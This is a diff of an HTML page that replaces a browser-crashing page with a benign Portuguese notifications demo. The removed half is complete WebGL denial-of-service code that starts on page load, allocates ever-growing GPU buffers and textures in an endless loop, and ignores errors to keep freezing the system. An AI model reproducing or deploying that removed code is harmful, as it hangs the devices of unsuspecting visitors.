@@ -1,223 +1,317 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <title>WebGL Crash Instantâneo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistema de Notificações</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
         body {
-            background: #000;
-            color: #ff0000;
-            font-family: 'Courier New', monospace;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-        }
-        
-        .warning {
-            text-align: center;
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
             padding: 20px;
-            animation: glitch 0.5s infinite;
+            background-color: #f5f5f5;
         }
         
-        @keyframes glitch {
-            0% { transform: translate(0); }
-            20% { transform: translate(-2px, 2px); }
-            40% { transform: translate(-2px, -2px); }
-            60% { transform: translate(2px, 2px); }
-            80% { transform: translate(2px, -2px); }
-            100% { transform: translate(0); }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
         }
         
         .status {
-            font-size: 24px;
-            margin: 20px;
-            text-align: center;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 5px;
+            font-weight: bold;
         }
         
-        .counter {
+        .granted {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .denied {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .default {
+            background-color: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeaa7;
+        }
+        
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px;
+            transition: background-color 0.3s;
+        }
+        
+        button:hover {
+            background-color: #0056b3;
+        }
+        
+        button:disabled {
+            background-color: #6c757d;
+            cursor: not-allowed;
+        }
+        
+        .controls {
+            margin: 20px 0;
+        }
+        
+        .notification-counter {
             font-size: 18px;
-            margin: 10px;
+            margin: 15px 0;
+            color: #666;
         }
         
-        canvas {
-            border: 1px solid #ff0000;
-            margin: 10px;
+        .log {
+            background-color: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 5px;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: left;
+            max-height: 200px;
+            overflow-y: auto;
         }
         
-        .flashing {
-            animation: flash 0.3s infinite alternate;
+        .log-entry {
+            padding: 5px 0;
+            border-bottom: 1px solid #eee;
+            font-family: monospace;
+            font-size: 14px;
         }
         
-        @keyframes flash {
-            from { opacity: 1; }
-            to { opacity: 0.3; }
+        .timestamp {
+            color: #666;
+            font-size: 12px;
         }
     </style>
 </head>
 <body>
-    <div class="warning">
-        <h1>⚠️ SISTEMA SENDO TRAVADO ⚠️</h1>
-        <p>CRASH WEBGL INSTANTÂNEO INICIADO</p>
+    <div class="container">
+        <h1>🔔 Sistema de Notificações</h1>
+        
+        <div class="status default" id="status">
+            Status: Aguardando permissão para notificações
+        </div>
+        
+        <div class="notification-counter">
+            Notificações enviadas: <span id="counter">0</span>
+        </div>
+        
+        <div class="controls">
+            <button onclick="requestPermission()" id="permissionBtn">
+                Solicitar Permissão de Notificações
+            </button>
+            
+            <button onclick="startNotifications()" id="startBtn" disabled>
+                Iniciar Notificações (2 segundos)
+            </button>
+            
+            <button onclick="stopNotifications()" id="stopBtn" disabled>
+                Parar Notificações
+            </button>
+        </div>
+        
+        <div class="log">
+            <strong>Log de Atividades:</strong>
+            <div id="logContainer"></div>
+        </div>
     </div>
-    
-    <div class="status" id="status">INICIANDO CRASH INSTANTÂNEO...</div>
-    <div class="counter">Buffers: <span id="bufferCount">0</span></div>
-    <canvas id="gl-canvas" width="800" height="600"></canvas>
 
     <script>
-        // Inicializa WebGL
-        const canvas = document.getElementById('gl-canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        
-        if (!gl) {
-            document.getElementById('status').textContent = 'WebGL não suportado';
-            throw new Error('WebGL não suportado');
-        }
+        let notificationInterval = null;
+        let notificationCount = 0;
+        let permissionGranted = false;
 
-        // Shaders simples
-        const vertexShaderSource = `
-            attribute vec2 a_position;
-            void main() {
-                gl_Position = vec4(a_position, 0.0, 1.0);
-                gl_PointSize = 2.0;
-            }
-        `;
-        
-        const fragmentShaderSource = `
-            precision highp float;
-            void main() {
-                gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0);
-            }
-        `;
-
-        // Compila shaders rapidamente
-        function createShader(gl, type, source) {
-            const shader = gl.createShader(type);
-            gl.shaderSource(shader, source);
-            gl.compileShader(shader);
-            return shader;
-        }
-
-        // Cria programa WebGL
-        const vertexShader = createShader(gl, gl.VERTEX_SHADER, vertexShaderSource);
-        const fragmentShader = createShader(gl, gl.FRAGMENT_SHADER, fragmentShaderSource);
-        const program = gl.createProgram();
-        gl.attachShader(program, vertexShader);
-        gl.attachShader(program, fragmentShader);
-        gl.linkProgram(program);
-        gl.useProgram(program);
-
-        // Estado do crash
-        let bufferCount = 0;
-        const buffers = [];
-        let crashMultiplier = 1;
-        let frameCount = 0;
-        
-        // Elementos da UI
+        // Elementos DOM
         const statusElement = document.getElementById('status');
-        const bufferCountElement = document.getElementById('bufferCount');
-        
-        // Função de crash WebGL infinito e instantâneo
-        function instantWebGLCrash() {
-            try {
-                frameCount++;
+        const counterElement = document.getElementById('counter');
+        const permissionBtn = document.getElementById('permissionBtn');
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const logContainer = document.getElementById('logContainer');
+
+        // Função para adicionar log
+        function addLog(message) {
+            const timestamp = new Date().toLocaleTimeString();
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log-entry';
+            logEntry.innerHTML = `<span class="timestamp">[${timestamp}]</span> ${message}`;
+            logContainer.appendChild(logEntry);
+            logContainer.scrollTop = logContainer.scrollHeight;
+        }
+
+        // Verificar se o navegador suporta notificações
+        function checkNotificationSupport() {
+            if (!('Notification' in window)) {
+                statusElement.textContent = 'Status: Este navegador não suporta notificações';
+                statusElement.className = 'status denied';
+                permissionBtn.disabled = true;
+                addLog('Navegador não suporta notificações');
+                return false;
+            }
+            return true;
+        }
+
+        // Solicitar permissão para notificações
+        function requestPermission() {
+            if (!checkNotificationSupport()) return;
+
+            addLog('Solicitando permissão para notificações...');
+            
+            Notification.requestPermission().then(permission => {
+                updatePermissionStatus(permission);
                 
-                // Aumenta agressivamente o multiplicador
-                crashMultiplier *= 2.5;
-                
-                // Cria MUITOS buffers instantaneamente
-                const buffersToCreate = Math.floor(50 * crashMultiplier);
-                
-                for (let i = 0; i < buffersToCreate; i++) {
-                    // Cria buffer com número massivo de vértices
-                    const vertexCount = Math.floor(500000 * crashMultiplier);
-                    const vertices = new Float32Array(vertexCount * 2);
-                    
-                    // Preenche com dados aleatórios
-                    for (let j = 0; j < vertexCount * 2; j++) {
-                        vertices[j] = Math.random() * 2 - 1;
-                    }
-                    
-                    // Cria e armazena o buffer
-                    const buffer = gl.createBuffer();
-                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-                    gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.DYNAMIC_DRAW);
-                    buffers.push(buffer);
-                    bufferCount++;
-                    
-                    // Atualiza contador
-                    bufferCountElement.textContent = bufferCount.toLocaleString();
-                    
-                    // Desenha para consumir recursos
-                    const positionLocation = gl.getAttribLocation(program, 'a_position');
-                    gl.enableVertexAttribArray(positionLocation);
-                    gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);
-                    
-                    // Múltiplos desenhos por buffer
-                    for (let k = 0; k < 10; k++) {
-                        gl.drawArrays(gl.POINTS, 0, vertexCount);
-                    }
-                }
-                
-                // Cria texturas enormes também
-                if (frameCount % 5 === 0) {
-                    const texture = gl.createTexture();
-                    gl.bindTexture(gl.TEXTURE_2D, texture);
-                    const size = Math.min(16384, 512 * crashMultiplier);
-                    const data = new Uint8Array(size * size * 4);
-                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
-                }
-                
-                // Atualiza status
-                if (frameCount < 10) {
-                    statusElement.textContent = `CRASH INICIADO - Frame ${frameCount}`;
-                } else if (frameCount < 20) {
-                    statusElement.textContent = `ACELERANDO - ${bufferCount.toLocaleString()} buffers`;
-                    statusElement.classList.add('flashing');
+                if (permission === 'granted') {
+                    permissionGranted = true;
+                    startBtn.disabled = false;
+                    // Enviar primeira notificação de teste
+                    sendNotification('Permissão concedida! Notificações ativadas.');
+                    addLog('Permissão concedida pelo usuário');
+                } else if (permission === 'denied') {
+                    addLog('Permissão negada pelo usuário');
                 } else {
-                    statusElement.textContent = `TRAVANDO SISTEMA - ${bufferCount.toLocaleString()} buffers`;
+                    addLog('Permissão ignorada pelo usuário');
                 }
-                
-                // Continua o loop infinito
-                requestAnimationFrame(instantWebGLCrash);
-                
-            } catch (e) {
-                // Ignora erros e continua tentando
-                statusElement.textContent = `CRASH COMPLETO - ${bufferCount.toLocaleString()} buffers criados`;
-                setTimeout(instantWebGLCrash, 10);
+            });
+        }
+
+        // Atualizar status da permissão
+        function updatePermissionStatus(permission) {
+            switch(permission) {
+                case 'granted':
+                    statusElement.textContent = 'Status: Permissão CONCEDIDA ✓';
+                    statusElement.className = 'status granted';
+                    break;
+                case 'denied':
+                    statusElement.textContent = 'Status: Permissão NEGADA ✗';
+                    statusElement.className = 'status denied';
+                    break;
+                default:
+                    statusElement.textContent = 'Status: Permissão PENDENTE';
+                    statusElement.className = 'status default';
             }
         }
-        
-        // Inicia o crash instantaneamente quando a página carrega
-        window.addEventListener('load', function() {
-            statusElement.textContent = 'INICIANDO CRASH INSTANTÂNEO...';
+
+        // Enviar notificação
+        function sendNotification(message = null) {
+            if (!permissionGranted) return;
+
+            notificationCount++;
+            const notificationMessage = message || `Notificação automática #${notificationCount}`;
             
-            // Pequeno delay para garantir que tudo carregou
+            const notification = new Notification('Sistema de Notificações', {
+                body: notificationMessage,
+                icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🔔</text></svg>',
+                badge: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🔔</text></svg>',
+                tag: 'auto-notification',
+                requireInteraction: false
+            });
+
+            // Atualizar contador
+            counterElement.textContent = notificationCount;
+            
+            // Adicionar ao log
+            addLog(`Notificação enviada: "${notificationMessage}"`);
+
+            // Fechar notificação automaticamente após 4 segundos
             setTimeout(() => {
-                instantWebGLCrash();
-            }, 100);
-        });
-        
-        // Também inicia se a página já estiver carregada
-        if (document.readyState === 'complete') {
-            setTimeout(() => {
-                instantWebGLCrash();
-            }, 100);
+                notification.close();
+            }, 4000);
+
+            // Tratar clique na notificação
+            notification.onclick = function() {
+                window.focus();
+                notification.close();
+                addLog('Usuário clicou na notificação');
+            };
         }
-        
-        // Desenho inicial rápido
-        gl.clearColor(0.0, 0.0, 0.0, 1.0);
-        gl.clear(gl.COLOR_BUFFER_BIT);
-        
+
+        // Iniciar notificações automáticas
+        function startNotifications() {
+            if (!permissionGranted) {
+                addLog('Erro: Permissão não concedida para iniciar notificações');
+                return;
+            }
+
+            addLog('Iniciando notificações automáticas (2 segundos)');
+            
+            // Enviar primeira notificação imediatamente
+            sendNotification('Notificações automáticas iniciadas!');
+            
+            // Configurar intervalo de 2 segundos
+            notificationInterval = setInterval(() => {
+                sendNotification();
+            }, 2000);
+
+            // Atualizar estado dos botões
+            startBtn.disabled = true;
+            stopBtn.disabled = false;
+            permissionBtn.disabled = true;
+        }
+
+        // Parar notificações automáticas
+        function stopNotifications() {
+            if (notificationInterval) {
+                clearInterval(notificationInterval);
+                notificationInterval = null;
+                addLog('Notificações automáticas paradas');
+                
+                // Enviar notificação final
+                if (permissionGranted) {
+                    sendNotification('Notificações automáticas paradas!');
+                }
+
+                // Atualizar estado dos botões
+                startBtn.disabled = false;
+                stopBtn.disabled = true;
+                permissionBtn.disabled = false;
+            }
+        }
+
+        // Verificar permissão atual ao carregar a página
+        window.addEventListener('load', function() {
+            addLog('Página carregada');
+            
+            if (checkNotificationSupport()) {
+                const currentPermission = Notification.permission;
+                updatePermissionStatus(currentPermission);
+                
+                if (currentPermission === 'granted') {
+                    permissionGranted = true;
+                    startBtn.disabled = false;
+                    addLog('Permissão já concedida anteriormente');
+                }
+            }
+        });
+
+        // Parar notificações ao sair da página
+        window.addEventListener('beforeunload', function() {
+            if (notificationInterval) {
+                clearInterval(notificationInterval);
+                addLog('Notificações paradas (página sendo fechada)');
+            }
+        });
     </script>
 </body>
 </html>
